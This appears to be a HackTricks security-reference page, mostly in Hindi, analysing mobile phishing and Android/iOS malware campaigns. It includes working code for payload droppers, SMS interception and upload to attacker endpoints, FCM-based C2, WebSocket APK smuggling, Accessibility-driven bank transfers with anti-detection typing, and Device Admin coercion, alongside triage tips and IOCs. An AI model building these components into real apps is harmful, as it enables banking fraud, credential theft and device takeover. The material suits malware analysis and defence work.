# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> यह पेज उन techniques को कवर करता है जो threat actors द्वारा **malicious Android APKs** और **iOS mobile-configuration profiles** को phishing (SEO, social engineering, fake stores, dating apps, etc.) के जरिए distribute करने के लिए इस्तेमाल की जाती हैं।
> यह सामग्री SarangTrap campaign से adapted है, जिसे Zimperium zLabs (2025) और अन्य public research ने expose किया था।

## Attack Flow

1. **SEO/Phishing Infrastructure**
* दर्जनों look-alike domains register करें (dating, cloud share, car service…).
– Google में rank करने के लिए `<title>` element में local language keywords और emojis use करें।
– एक ही landing page पर *दोनों* Android (`.apk`) और iOS install instructions host करें।
2. **First Stage Download**
* Android: unsigned या “third-party store” APK का direct link।
* iOS: `itms-services://` या malicious **mobileconfig** profile का plain HTTPS link (नीचे देखें)।
3. **Post-install Social Engineering**
* पहली run पर app **invitation / verification code** मांगती है (exclusive access illusion)।
* code को HTTP के जरिए Command-and-Control (C2) पर **POST** किया जाता है।
* C2 `{"success":true}` reply करता है ➜ malware आगे बढ़ता है।
* Sandbox / AV dynamic analysis जो valid code कभी submit नहीं करती, उसे **कोई malicious behaviour** नहीं दिखता (evasion)।
4. **Runtime Permission Abuse** (Android)
* Dangerous permissions केवल **positive C2 response** के बाद request की जाती हैं:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Recent variants `AndroidManifest.xml` से SMS के लिए `<uses-permission>` **remove** कर देती हैं, लेकिन Java/Kotlin code path जो reflection के जरिए SMS पढ़ता है उसे छोड़ देती हैं ⇒ static score कम होता है जबकि permission को `AppOps` abuse या पुराने targets के जरिए grant करने वाले devices पर functionality बनी रहती है।

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 ने sideloaded apps के लिए **Restricted settings** introduce किए: Accessibility और Notification Listener toggles greyed out रहते हैं जब तक user **App info** में restricted settings explicitly allow न करे।
* अब phishing pages और droppers step-by-step UI instructions के साथ आते हैं ताकि user sideloaded app के लिए **allow restricted settings** करे और फिर Accessibility/Notification access enable करे।
* एक नया bypass payload को **session-based PackageInstaller flow** के जरिए install करना है (यही method app stores use करते हैं)। Android app को store-installed मानता है, इसलिए Restricted settings अब Accessibility को block नहीं करती।
* Triage hint: dropper में `PackageInstaller.createSession/openSession` के लिए grep करें, साथ में वह code जो victim को तुरंत `ACTION_ACCESSIBILITY_SETTINGS` या `ACTION_NOTIFICATION_LISTENER_SETTINGS` पर ले जाता है।

6. **Facade UI & Background Collection**
* App locally implement किए गए harmless views (SMS viewer, gallery picker) दिखाती है।
* Meanwhile, यह exfiltrate करती है:
- IMEI / IMSI, phone number
- Full `ContactsContract` dump (JSON array)
- `/sdcard/DCIM` से JPEG/PNG, जिसे size कम करने के लिए [Luban](https://github.com/Curzibn/Luban) के साथ compressed किया जाता है
- Optional SMS content (`content://sms`)
Payloads को **batch-zipped** किया जाता है और `HTTP POST /upload.php` के जरिए भेजा जाता है।
7. **iOS Delivery Technique**
* एक single **mobile-configuration profile** `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. request कर सकता है ताकि device को “MDM”-like supervision में enroll किया जा सके।
* Social-engineering instructions:
1. Settings खोलें ➜ *Profile downloaded*।
2. *Install* तीन बार tap करें (phishing page पर screenshots)।
3. unsigned profile पर trust करें ➜ attacker को App Store review के बिना *Contacts* & *Photo* entitlement मिल जाता है।
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads एक phishing URL को Home Screen पर branded icon/label के साथ **pin** कर सकते हैं।
* Web Clips **full-screen** run कर सकते हैं (browser UI छिप जाता है) और उन्हें **non-removable** mark किया जा सकता है, जिससे victim को icon हटाने के लिए profile delete करना पड़ता है।
9. **Network Layer**
* Plain HTTP, अक्सर port 80 पर HOST header जैसे `api.<phishingdomain>.com` के साथ।
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → easy to spot)।

## Red-Team Tips

* **Dynamic Analysis Bypass** – malware assessment के दौरान, invitation code phase को Frida/Objection से automate करें ताकि malicious branch तक पहुंचा जा सके।
* **Manifest vs. Runtime Diff** – `aapt dump permissions` को runtime `PackageManager#getRequestedPermissions()` से compare करें; missing dangerous perms एक red flag है।
* **Network Canary** – code entry के बाद unsolid POST bursts detect करने के लिए `iptables -p tcp --dport 80 -j NFQUEUE` configure करें।
* **mobileconfig Inspection** – macOS पर `security cms -D -i profile.mobileconfig` use करें ताकि `PayloadContent` list हो जाए और excessive entitlements spot किए जा सकें।

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## संकेतक (Generic)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

इस pattern को government-benefit themes का दुरुपयोग करके Indian UPI credentials और OTPs चुराने वाली campaigns में देखा गया है। Operators delivery और resilience के लिए reputable platforms को chain करते हैं।

### Trusted platforms के across delivery chain
- YouTube video lure → description में एक short link होता है
- Shortlink → GitHub Pages phishing site जो legit portal की नकल करती है
- वही GitHub repo एक APK host करता है, जिसमें fake “Google Play” badge होता है जो सीधे file से link करता है
- Dynamic phishing pages Replit पर चलते हैं; remote command channel Firebase Cloud Messaging (FCM) का उपयोग करता है

### Embedded payload और offline install वाला Dropper
- पहला APK एक installer (dropper) होता है जो `assets/app.apk` में real malware ships करता है और user को Wi‑Fi/mobile data disable करने के लिए prompt करता है ताकि cloud detection को blunt किया जा सके।
- Embedded payload एक innocuous label (जैसे, “Secure Update”) के under install होता है। Install के बाद installer और payload दोनों separate apps के रूप में present होते हैं।

Static triage tip (embedded payloads के लिए grep करें):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### शॉर्टलिंक के माध्यम से डायनामिक endpoint discovery
- Malware एक shortlink से live endpoints की plain-text, comma-separated सूची fetch करता है; simple string transforms final phishing page path बनाते हैं।

Example (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-code:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- “Make payment of ₹1 / UPI‑Lite” स्टेप एक WebView के अंदर dynamic endpoint से attacker HTML form लोड करता है और संवेदनशील fields (phone, bank, UPI PIN) को capture करता है, जिन्हें `addup.php` पर `POST` किया जाता है।

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### स्व-प्रसार और SMS/OTP इंटरसेप्शन
- पहले रन पर आक्रामक permissions मांगी जाती हैं:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- संपर्कों को victim’s device से mass-send smishing SMS भेजने के लिए loop किया जाता है।
- Incoming SMS को एक broadcast receiver द्वारा intercept किया जाता है और metadata (sender, body, SIM slot, per-device random ID) के साथ `/addsm.php` पर upload किया जाता है।

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) as resilient C2
- Payload FCM में रजिस्टर होता है; push messages में एक `_type` field होता है, जिसे switch की तरह use करके actions trigger किए जाते हैं (e.g., phishing text templates update करना, behaviours toggle करना).

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler स्केच:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicators/IOCs
- APK में secondary payload `assets/app.apk` पर होता है
- WebView `gate.htm` से payment लोड करता है और `/addup.php` पर exfiltrates करता है
- SMS exfiltration to `/addsm.php`
- Shortlink-driven config fetch (e.g., `rebrand.ly/*`) जो CSV endpoints लौटाता है
- Apps को generic “Update/Secure Update” के रूप में label किया जाता है
- Untrusted apps में FCM `data` messages जिनमें `_type` discriminator होता है

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers increasingly static APK links को Socket.IO/WebSocket channel से replace करते हैं, जिसे Google Play–looking lures में embed किया जाता है. यह payload URL को conceal करता है, URL/extension filters को bypass करता है, और एक realistic install UX बनाए रखता है.

Typical client flow observed in the wild:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

क्यों यह सरल controls को evade करता है:
- कोई static APK URL exposed नहीं होता; payload WebSocket frames से memory में reconstruct होता है।
- URL/MIME/extension filters जो direct .apk responses को block करते हैं, वे WebSockets/Socket.IO के जरिए tunneled binary data को miss कर सकते हैं।
- Crawlers और URL sandboxes जो WebSockets execute नहीं करते, payload retrieve नहीं करेंगे।

यह भी देखें WebSocket tradecraft और tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

RatOn banker/RAT campaign (ThreatFabric) modern mobile phishing operations का एक concrete example है, जो WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, और यहां तक कि NFC-relay orchestration को blend करता है। यह section reusable techniques को abstract करता है।

### Stage-1: WebView → native install bridge (dropper)
Attackers एक WebView present करते हैं जो attacker page की ओर point करता है और एक JavaScript interface inject करते हैं जो native installer expose करता है। HTML button पर tap native code को call करता है, जो dropper के assets में bundled second-stage APK install करता है और फिर उसे सीधे launch करता है।

Minimal pattern:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

पेज पर HTML:
```html
<button onclick="bridge.installApk()">Install</button>
```
इंस्टॉल के बाद, dropper explicit package/activity के जरिए payload शुरू करता है:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: untrusted apps calling `addJavascriptInterface()` and exposing installer-like methods to WebView; APK shipping an embedded secondary payload under `assets/` and invoking the Package Installer Session API.

### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 एक WebView खोलता है जो एक “Access” page होस्ट करता है। इसका button एक exported method invoke करता है जो victim को Accessibility settings तक ले जाता है और rogue service को enable करने के लिए request करता है। once granted, malware Accessibility का उपयोग करके बाद के runtime permission dialogs (contacts, overlay, manage system settings, etc.) में auto-click करता है और Device Admin request करता है।

- Accessibility programmatically बाद के prompts को accept करने में मदद करता है, node-tree में “Allow”/“OK” जैसे buttons ढूँढकर और clicks dispatch करके।
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### WebView के माध्यम से overlay phishing/ransom
Operators ये commands issue कर सकते हैं:
- किसी URL से full-screen overlay render करें, या
- inline HTML pass करें जिसे WebView overlay में load किया जाता है।

संभावित उपयोग: coercion (PIN entry), PINs capture करने के लिए wallet opening, ransom messaging. Overlay permission अगर missing हो तो ensure करने के लिए एक command रखें।

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: समय-समय पर Accessibility node tree dump करें, visible texts/roles/bounds serialize करें, और C2 को pseudo-screen के रूप में भेजें (commands जैसे `txt_screen` once और `screen_live` continuous)।
- High-fidelity: जरूरत पर MediaProjection request करें और screen-casting/recording शुरू करें (commands जैसे `display` / `record`)।

### ATS playbook (bank app automation)
एक JSON task मिलने पर, bank app open करें, Accessibility के जरिए UI drive करें, text queries और coordinate taps का mix उपयोग करें, और prompt आने पर victim का payment PIN enter करें।

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
उदाहरण के पाठ जो एक target flow में देखे गए (CZ → EN):
- "Nová platba" → "New payment"
- "Zadat platbu" → "Enter payment"
- "Nový příjemce" → "New recipient"
- "Domácí číslo účtu" → "Domestic account number"
- "Další" → "Next"
- "Odeslat" → "Send"
- "Ano, pokračovat" → "Yes, continue"
- "Zaplatit" → "Pay"
- "Hotovo" → "Done"

Operators `check_limit` और `limit` जैसे commands के जरिए transfer limits को भी check/raise कर सकते हैं, जो limits UI में इसी तरह navigate करते हैं।

### Crypto wallet seed extraction
MetaMask, Trust Wallet, Blockchain.com, Phantom जैसे targets. Flow: unlock (stolen PIN or provided password), Security/Recovery पर navigate करें, seed phrase reveal/show करें, keylog/exfiltrate it. Navigation को अलग-अलग languages में stable रखने के लिए locale-aware selectors (EN/RU/CZ/SK) implement करें।

### Device Admin coercion
Device Admin APIs का उपयोग PIN-capture opportunities बढ़ाने और victim को परेशान करने के लिए किया जाता है:

- Immediate lock:
```java
dpm.lockNow();
```
- वर्तमान credential को expire करें ताकि change force हो सके (Accessibility नया PIN/password capture करता है):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- बायोमेट्रिक keyguard फीचर्स को disable करके non-biometric unlock को force करें:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: Recent Android पर कई DevicePolicyManager controls के लिए Device Owner/Profile Owner चाहिए; कुछ OEM builds में ढील हो सकती है। Target OS/OEM पर हमेशा validate करें।

### NFC relay orchestration (NFSkate)
Stage-3 एक external NFC-relay module (e.g., NFSkate) install और launch कर सकता है, और relay के दौरान victim को guide करने के लिए उसे एक HTML template भी दे सकता है। इससे online ATS के साथ-साथ contactless card-present cash-out भी possible हो जाता है।

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

Threat actors increasingly Accessibility-driven automation को basic behaviour biometrics के खिलाफ tuned anti-detection के साथ blend कर रहे हैं। एक recent banker/RAT में दो complementary text-delivery modes और operator toggle दिखता है, जो randomized cadence के साथ human typing simulate करता है।

- Discovery mode: visible nodes को selectors और bounds के साथ enumerate करें ताकि acting से पहले inputs (ID, text, contentDescription, hint, bounds) को precisely target किया जा सके।
- Dual text injection:
- Mode 1 – target node पर सीधे `ACTION_SET_TEXT` (stable, no keyboard);
- Mode 2 – clipboard set + focused node में `ACTION_PASTE` (जब direct setText blocked हो तब काम करता है)।
- Human-like cadence: operator-provided string को split करें और events के बीच randomized 300–3000 ms delays के साथ उसे character-by-character deliver करें ताकि “machine-speed typing” heuristics evade हो सकें। इसे या तो `ACTION_SET_TEXT` के जरिए value को progressively बढ़ाकर, या एक-एक char paste करके implement किया जाता है।

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

धोखाधड़ी के लिए blocking overlays में शामिल हैं:
- operator-controlled opacity के साथ full-screen `TYPE_ACCESSIBILITY_OVERLAY` render करें; इसे victim के लिए opaque रखें जबकि remote automation नीचे की ओर जारी रहे।
- आम तौर पर exposed commands: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Adjustable alpha के साथ minimal overlay:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Operator control primitives often seen: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## WebView bridge, JNI string decoder, and staged DEX loading वाला बहु-चरणीय Android dropper

CERT Polska के 03 April 2026 विश्लेषण of **cifrat** एक आधुनिक phishing-delivered Android loader के लिए अच्छा reference है, जहाँ visible APK सिर्फ एक installer shell है। Reusable tradecraft family name नहीं है, बल्कि stages को जिस तरह chain किया जाता है, वह है:

1. Phishing page lure APK deliver करती है।
2. Stage 0 `REQUEST_INSTALL_PACKAGES` request करता है, native `.so` load करता है, embedded blob decrypt करता है, और **PackageInstaller sessions** के साथ stage 2 install करता है।
3. Stage 2 एक और hidden asset decrypt करता है, उसे ZIP मानता है, और final RAT के लिए **dynamically loads DEX** करता है।
4. Final stage Accessibility/MediaProjection का abuse करता है और control/data के लिए WebSockets का उपयोग करता है।

### WebView JavaScript bridge as the installer controller

WebView को सिर्फ fake branding के लिए use करने के बजाय, lure एक bridge expose कर सकता है जो local/remote page को device fingerprint करने और native install logic trigger करने देता है:
```java
webView.addJavascriptInterface(controller, "Android");
webView.loadUrl("file:///android_asset/bootstrap.html");

@JavascriptInterface
public String get_SYSINFO() { /* SDK, model, manufacturer, locale */ }

@JavascriptInterface
public void start() { mainHandler.post(this::installStage2); }
```
Triage विचार:
- `addJavascriptInterface`, `@JavascriptInterface`, `loadUrl("file:///android_asset/` और उसी activity में इस्तेमाल हुए remote phishing URLs के लिए `grep` करें
- installer-जैसे methods (`start`, `install`, `openAccessibility`, `requestOverlay`) expose करने वाले bridges पर नज़र रखें
- अगर bridge किसी phishing page द्वारा backed है, तो उसे सिर्फ UI नहीं, बल्कि operator/controller surface मानें

### `JNI_OnLoad` में registered Native string decoding

एक उपयोगी pattern एक Java method है जो harmless दिखती है लेकिन वास्तव में `JNI_OnLoad` के दौरान `RegisterNatives` द्वारा backed होती है। cifrat में, decoder ने first char को ignore किया, दूसरे char को 1-byte XOR key के रूप में use किया, बाकी को hex-decoded किया, और हर byte को `((b - i) & 0xff) ^ key` के रूप में transform किया।

Minimal offline reproduction:
```python
def decode_native(s: str) -> str:
key = ord(s[1]); raw = bytes.fromhex(s[2:])
return bytes((((b - i) & 0xFF) ^ key) for i, b in enumerate(raw)).decode()
```
Use this when you see:
- repeated calls to one native-backed Java method for URLs, package names, or keys
- `JNI_OnLoad` resolving classes and calling `RegisterNatives`
- no meaningful plaintext strings in DEX, but many short hex-looking constants passed into one helper

### Layered payload staging: XOR resource -> installed APK -> RC4-like asset -> ZIP -> DEX

This family used two unpacking layers that are worth hunting generically:

- **Stage 0**: `res/raw/*.bin` को native decoder के जरिए निकली XOR key से decrypt करें, फिर plaintext APK को `PackageInstaller.createSession` -> `openWrite` -> `fsync` -> `commit` के माध्यम से install करें
- **Stage 2**: `FH.svg` जैसा एक innocuous asset extract करें, उसे RC4-like routine से decrypt करें, result को ZIP के रूप में parse करें, फिर hidden DEX files load करें

यह एक real dropper/loader pipeline का strong indicator है, क्योंकि हर layer basic static scanning से next stage को opaque रखती है।

Quick triage checklist:
- `REQUEST_INSTALL_PACKAGES` plus `PackageInstaller` session calls
- `PACKAGE_ADDED` / `PACKAGE_REPLACED` के लिए receivers, ताकि install के बाद chain जारी रहे
- `res/raw/` या `assets/` के under encrypted blobs, जिनके extensions non-media हों
- `DexClassLoader` / `InMemoryDexClassLoader` / ZIP handling, custom decryptors के close to

### Native anti-debugging through `/proc/self/maps`

Native bootstrap ने `/proc/self/maps` को `libjdwp.so` के लिए scan किया और अगर वह present था तो abort कर दिया। यह एक practical early anti-analysis check है, क्योंकि JDWP-backed debugging एक recognizable mapped library छोड़ती है:
```c
FILE *f = fopen("/proc/self/maps", "r");
while (fgets(line, sizeof(line), f)) {
if (strstr(line, "libjdwp.so")) return -1;
}
```
विचार खोजने के लिए:
- native code / decompiler output में `/proc/self/maps`, `libjdwp.so`, `frida`, `qemu`, `goldfish`, `ranchu` के लिए grep करें
- अगर Frida hooks बहुत देर से आते हैं, तो पहले `.init_array` और `JNI_OnLoad` देखें
- anti-debug + string decoder + staged install को एक cluster के रूप में लें, independent findings के रूप में नहीं

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Analysis of cifrat: could this be an evolution of a mobile RAT?](https://cert.pl/en/posts/2026/04/cifrat-analysis/)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
